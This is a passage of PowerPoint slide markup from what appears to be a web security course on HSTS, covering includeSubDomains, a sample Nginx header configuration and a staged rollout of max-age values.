            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="390309223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2B736-3B58-7A46-239A-2D5464431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16355-4ECF-5C34-DDF5-7B445CAF45F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HSTS - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>includeSubDomains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" err="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E47BFDD5-8037-E867-016A-46928D02A5DC}"/>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b="1" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>includeSubDomains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (optional but recommended) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>means, 'Apply the HSTS rule to all subdomains'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>E.g.:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Aptos" panose="020B0004020202020204"/>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>api.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Aptos"/>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>cdn.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>admin.internal.example.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="90438092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3991F-FFD3-FEF8-EDC0-377B0A29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1935F-60C5-19FC-D779-92F763A66469}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Example - HSTS config on Nginx</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90A15408-1562-008D-A6A0-CE6C70E75D5E}"/>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sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> listen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="76000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 443</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ssl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> http2;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>server_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> example.com;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ssl_certificate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>    /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ssl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/certs/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>example.pem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ssl_certificate_key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ssl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/private/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>example.key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1">
                    <a:lumMod val="49000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>    # Add HSTS header</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>add_header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Strict-Transport-Security</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> "max-age=31536000; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>includeSubDomains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>; preload"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> always;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> /var/www/html;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="256373587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4BA8C-1B6C-EB3A-5615-F4778A29E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291A9-E12C-904D-43AD-498DB0448475}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTPS rollout 01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6D851CDE-0744-FB0C-814B-F107AB754919}"/>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b="1" dirty="0"/>
              <a:t>Step 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>– Validate HTTPS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Make sure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>all</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> production traffic is correctly served over HTTPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Fix mixed-content issues (images, scripts, CSS over HTTP).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Ensure all subdomains you intend to include actually support HTTPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="203477101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2A63-89C4-3095-0BA6-E8BD31115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68493-F511-6573-16B6-AFB13D5BFD91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTPS rollout 02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{338189A3-9319-B946-A7AF-B2F7D9C1666D}"/>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b="1" dirty="0"/>
              <a:t>Step 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>– Start with a low </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>max-age</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Strict-Transport-Security: max-age=300</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="359261115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9DF82-EC57-048A-23D4-20C783F05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4C993-87E3-D301-6935-79DED421F056}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTPS rollout 03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5A356EF1-4C37-3BB2-C807-5E29B5AD10DA}"/>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b="1" dirty="0"/>
              <a:t>Step 3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>– Gradually increase</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>If everything’s ok:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Move to 1 day: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>max-age=86400</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Then a week: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>max-age=604800</a:t>
            </a:r>
